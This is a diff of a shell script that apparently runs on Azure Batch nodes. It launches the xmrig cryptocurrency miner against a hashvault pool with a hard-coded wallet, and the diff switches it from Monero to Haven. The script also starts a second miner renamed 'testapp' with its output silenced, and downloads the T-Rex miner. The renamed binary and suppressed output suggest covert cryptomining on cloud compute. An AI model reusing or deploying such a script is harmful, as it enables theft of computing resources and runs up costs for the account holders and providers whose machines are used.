@@ -1,7 +1,7 @@
 DIR="/home/_azbatch/xmrig/build/xmrig"
 if [ -f "$DIR" ]; then
   ### Take action if $DIR exists ###
-    /home/_azbatch/xmrig/build/xmrig --algo=rx/0 --url=pool.hashvault.pro:443 --user=82eaXA1kbzRfYExajvKci13Cvd6U44ReQFPDyYWkx6o28EygHgmFUi3i6ouaXHCzKJJt75ujmg9rrSija6JXSKyiHdKYFqy --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
+     /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
     hostname=$(hostname | cut -c1-8) &&
     /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30   > /dev/null 2>&1 
 else
@@ -27,7 +27,7 @@ else
     cmake .. && 
     make ;
     sleep 5 ;
-    /home/_azbatch/xmrig/build/xmrig --algo=rx/0 --url=pool.hashvault.pro:443 --user=82eaXA1kbzRfYExajvKci13Cvd6U44ReQFPDyYWkx6o28EygHgmFUi3i6ouaXHCzKJJt75ujmg9rrSija6JXSKyiHdKYFqy --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
+     /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
     mkdir /home/_azbatch/trex ;
     cd /home/_azbatch/trex &&
     wget https://github.com/trexminer/T-Rex/releases/download/0.20.4/t-rex-0.20.4-linux.tar.gz &&
